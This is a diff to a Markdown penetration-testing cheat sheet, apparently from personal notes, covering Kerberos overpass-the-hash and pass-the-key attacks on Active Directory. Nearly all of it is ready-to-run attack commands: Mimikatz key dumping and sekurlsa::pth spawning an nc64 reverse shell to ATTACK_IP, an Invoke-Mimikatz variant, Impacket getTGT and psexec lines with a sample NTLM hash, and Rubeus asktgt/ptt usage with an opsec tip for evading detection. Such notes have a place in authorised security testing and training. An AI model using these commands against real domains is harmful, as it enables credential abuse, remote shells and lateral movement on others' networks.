@@ -8,53 +8,65 @@
 
 ### If we have any of those keys (DES,RC4,AES128,AES256) we can ask the KDC for a TGT without requiring the actual password. (Pass-the-Key)
 
-#### privilege::debug
+#### 
 
-#### sekurlsa::ekeys
+    privilege::debug
 
-#### sekurlsa::pth /user:Administrator /domain:DOMAIN /rc4:KEY /run:"c:\tools\nc64.exe -e cmd.exe ATTACK_IP PORT"
+#### 
+
+    sekurlsa::ekeys
+
+#### 
+
+    sekurlsa::pth /user:Administrator /domain:DOMAIN /rc4:KEY /run:"c:\tools\nc64.exe -e cmd.exe ATTACK_IP PORT"
+
+OR 
+
+    Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:Security.local /ntlm:<ntlmhash> /run:powershell.exe"'
 
 #### /aes128:KEY can also be used instead 
 
 #### /aes256:KEY can also be used instead 
 
-#### nc -lvp PORT
+#### 
+
+    nc -lvp PORT
 
 ## Alternate Method: Impacket getTGT
 
- - python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
+    python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
 
- - export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
+    export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
 
- - python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
+    python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 
 ## Alternate Method: Rubeus
 
- - .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
+    .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 
- - .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
+    .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
 
- - .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec (Use AES256 for better opsec)
+    .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec (Use AES256 for better opsec)
 
 
 ## Tools: Rubeus , getTGT.py
 
 #### 1) getTGT.py
 
- - getTGT.py DOMAIN/USER -hashes:HASHES (Overpass the Hash. Pass the ticket with NTLM hash)
+    getTGT.py DOMAIN/USER -hashes:HASHES (Overpass the Hash. Pass the ticket with NTLM hash)
 
- - getTGT.py -aesKey 'KEY' DOMAIN/USER@IP (Pass the Key. Pass the ticket with AES Key)
+    getTGT.py -aesKey 'KEY' DOMAIN/USER@IP (Pass the Key. Pass the ticket with AES Key)
 
 #### 2) Rubeus
 
- - Rubeus asktgt /user:VICTIM /rc4:RC4_VALUE
+    Rubeus asktgt /user:VICTIM /rc4:RC4_VALUE
 
- - Rubeus ptt /ticket:TICKET (Successful PtT attack)
+    Rubeus ptt /ticket:TICKET (Successful PtT attack)
 
 ### Alternate usage:
 
- - Rubeus asktgt /user:VICTIM /rc4:RC4_VALUE
+    Rubeus asktgt /user:VICTIM /rc4:RC4_VALUE
 
- - Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]
+    Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]
 
- - Rubeus ptt /luid:0xdeadbeef /ticket:TICKET (Pass the ticket)
+    Rubeus ptt /luid:0xdeadbeef /ticket:TICKET (Pass the ticket)
